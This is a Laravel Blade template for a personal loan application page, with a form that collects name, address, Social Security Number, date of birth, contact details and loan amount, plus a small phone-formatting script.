@extends('layouts.app')

@section('section')
<section class="p100">
    <div class="container">
            <div class="fs-52 mb-50">
                Apply Now
            </div>
            <p class="fs-24">Personal Loan</p>
            <p>Get up to $10,000 with a low, fixed rate loan</p>
            <ul class="mb-50">
                <li>Affordable monthly payments</li>
                <li>Enjoy the benefits of No Prepayment fees with affiliated banks, making it easier for you to manage your finances.</li>
                <li>Experience fast funding that gets you the support you need without the wait!</li>
            </ul>

            <form method="POST">
                @csrf
                <div class="inputGrid mb-50">

                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">First Name*</label>
                        <input type="text" name="First Name" placeholder="Your Name" required>
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">Last Name*</label>
                        <input type="text" name="Last Name" placeholder="Your Last Name">
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">Street Address*</label>
                        <input type="text" name="Street Address" placeholder="Enter Your Street Address">
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">Street Address Line 2*</label>
                        <input type="text" name="Street Address Line 2" placeholder="Enter Your Street Address 2">
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">City*</label>
                        <input type="text" name="City" placeholder="Enter Your City" required>
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">State*</label>
                        <input type="text" name="State" placeholder="Enter Your City" required >
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">Zip code*</label>
                        <input type="text" maxlength="5" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);" name="Zip code" placeholder="Enter Your Zip code" required>
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">Social Security Number*</label>
                        <input type="number" maxlength="9" pattern="\d{9}"  oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 9);" name="Social Security Number" placeholder="Enter Your Security Number" required >
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">Date of Birth*</label>
                        <input type="date" name="dob" placeholder="Enter Your Date of Birth" required>
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">Email Address*</label>
                        <input type="email" name="Email Address" placeholder="Enter your Email" required>
                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">Phone*</label>
                        <input
                        type="text"
                        id="phone"
                        name="Phone"
                        placeholder="741-746-8547"
                        required
                        maxlength="12"
                        oninput="formatPhone(this)"
                        pattern="\d{3}-\d{3}-\d{4}"
                        title="Format: 741-746-8547"
                    >
                                    </div>
                    <div class="mb-22 fs-20 w-100 animated-div">
                        <label for="name">Select Loan Amount*</label>
                        <select name="select loan" id="" style="width: 300px;" required>
                            <option value="2,000">$2,000</option>
                            <option value="3,000">$3,000</option>
                            <option value="4,000">$4,000</option>
                            <option value="5,000">$5,000</option>
                            <option value="6,000">$6,000</option>
                            <option value="7,000">$7,000</option>
                            <option value="8,000">$8,000</option>
                            <option value="9,000">$9,000</option>
                            <option value="10,000">$10,000</option>
                        </select>
                    </div>
                </div>
                <button class="btn  animated-div" type="submit">
                    Apply
                </button>
            </form>
    </div>
</section>
<script>
    function formatPhone(input) {
        let value = input.value.replace(/\D/g, '').slice(0, 10); // Only digits, max 10
        let formatted = '';
    
        if (value.length > 0) formatted = value.slice(0, 3);
        if (value.length >= 4) formatted += '-' + value.slice(3, 6);
        if (value.length >= 7) formatted += '-' + value.slice(6, 10);
    
        input.value = formatted;
    }
    </script>
@endsection
